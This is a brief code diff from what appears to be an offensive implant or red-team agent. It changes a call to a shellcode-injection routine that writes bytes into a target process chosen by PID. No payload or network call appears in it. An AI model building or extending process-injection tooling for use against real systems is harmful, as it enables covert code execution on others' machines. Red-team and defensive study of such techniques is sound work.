@@ -38,7 +38,7 @@ namespace Task
         );
 
         // Inject shellcode
-        if (!Technique::Injection::ShellcodeInjection(dwPid, bytes))
+        if (!Technique::Injection::ShellcodeInjection(pState->pProcs, dwPid, bytes))
         {
             return L"Error: Failed to inject shellcode.";
         }
